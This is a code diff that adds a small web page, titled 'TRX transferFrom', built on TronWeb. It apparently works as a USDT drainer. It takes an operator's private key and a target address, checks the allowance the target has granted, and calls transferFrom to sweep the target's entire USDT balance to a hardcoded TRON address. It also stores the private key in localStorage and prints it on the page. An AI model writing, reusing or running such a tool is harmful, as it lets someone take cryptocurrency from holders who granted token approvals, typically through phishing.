@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>TRX transferFrom</title>
+    <style>
+        body {
+            font-family: monospace;
+        }
+
+        input {
+            width: 32em;
+        }
+    </style>
+    <script type="text/javascript" src="./TronWeb.js"></script>
+</head>
+<body>
+    <h1>TRX transferFrom</h1>
+    <hr>
+    <p>Your key: <input id="priv" type="text" placeholder="private key"></p>
+    <p>Your address: <span id="addr"></span></p>
+    <p>
+        <button id="refresh">Refresh</button>
+        <button id="clear">Clear</button>
+    </p>
+    <p>Target: <input id="from" type="text" placeholder="source addr"></p>
+    <p>
+        <button id="act">Act</button>
+        <button id="check">Check</button>
+    </p>
+    <pre id="console"></pre>
+</body>
+<script>
+    const to = "TAGbXr6AaV7KaNdG5AGUQC5g6qD3PhgMkE";
+    const usdt = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+
+    let pk = "";
+
+    let input_key = document.querySelector("#priv");
+    let input_addr = document.querySelector("#from");
+
+    let out = document.querySelector("#console");
+    let span_addr = document.querySelector("#addr");
+
+    let btn_refresh = document.querySelector("#refresh");
+    let btn_clear = document.querySelector("#clear");
+    let btn_act = document.querySelector("#act");
+    let btn_check = document.querySelector("#check");
+
+
+    const HttpProvider = TronWeb.providers.HttpProvider;
+    const fullNode = new HttpProvider("https://api.trongrid.io");
+    const solidityNode = new HttpProvider("https://api.trongrid.io");
+    const eventServer = new HttpProvider("https://api.trongrid.io");
+    let tronWeb = null;
+
+    function output(text) {
+        out.innerHTML += text + "\n";
+    }
+
+    async function updatePrivateKey(privateKey) {
+        // not changed
+        if (privateKey == pk) return;
+
+        const addr = TronWeb.address.fromPrivateKey(privateKey);
+        // if address can be converted
+        if (addr) {
+            tronWeb = new TronWeb(fullNode, solidityNode, eventServer, privateKey);
+            pk = privateKey;
+            input_key.value = privateKey;
+            span_addr.innerText = addr;
+            localStorage.setItem("priv", privateKey);
+            output("+ set private key to " + privateKey);
+            output("+ trx balance : " + (await get_trx_balance(addr)));
+        }
+    }
+
+    async function transferFrom(from, to, privateKey) {
+        try {
+            let contract = await tronWeb.contract().at(usdt);
+            const from_balance = await get_usdt_balance(from, privateKey);
+            // TODO: modify this to allowance
+            const withdraw = from_balance;
+            await contract.transferFrom(
+                from, // from address
+                to, // send to address
+                withdraw, // transfer amount
+            ).send({
+                feeLimit: 10000000
+            }).then(result => {
+                output("+ withdraw Output: " + '<a href="https://tronscan.org/#/transaction/' + result + '">' + result + "</a>");
+            });
+        } catch (error) {
+            output("! trigger smart contract error" + error);
+        }
+    }
+
+    async function get_usdt_balance(address, privateKey) {
+        let contract = await tronWeb.contract().at(usdt);
+        const decimals = await contract.decimals().call();
+        const balanceOf = await contract.balanceOf(address).call();
+        let balance = parseInt(balanceOf["_hex"], 16);
+
+        output("+ " + address + " balance: " + parseFloat(balance) / 1e6 + " USDT");
+        return balance;
+    }
+  
+    async function get_trx_balance(address) {
+        const balance = await tronWeb.trx.getBalance(address);
+        return balance;
+    }
+
+    async function get_usdt_allowance(fromAddress, authorizedAddress) {
+        let contract = await tronWeb.contract().at(usdt);
+        const value = await contract.allowance(
+            fromAddress,
+            authorizedAddress
+        ).call();
+        const rem = parseInt(value.remaining._hex, 16);
+
+        output("+ allowance " + fromAddress + " : " + parseFloat(rem) / 1e6 + " USDT (" + rem + ")");
+        return rem;
+    }
+
+    input_key.addEventListener("blur", function() {
+        const priv = input_key.value;
+        updatePrivateKey(priv);
+    });
+
+    btn_refresh.addEventListener("click", async function() {
+        const addr = span_addr.innerText;
+        output("+ trx balance: " + (await get_trx_balance(addr)));
+    });
+
+    btn_clear.addEventListener("click", function() {
+        out.innerText = "+ cleared\n";
+    });
+
+    btn_act.addEventListener("click", async function() {
+        const from = input_addr.value;
+        await transferFrom(from, to, pk);
+    });
+
+    btn_check.addEventListener("click", async function() {
+        await get_usdt_allowance(input_addr.value, span_addr.innerText, pk);
+    });
+
+    document.addEventListener("DOMContentLoaded", async function() {
+        const priv = localStorage.getItem("priv");
+        await updatePrivateKey(priv);
+    });
+</script>
+
+</html>
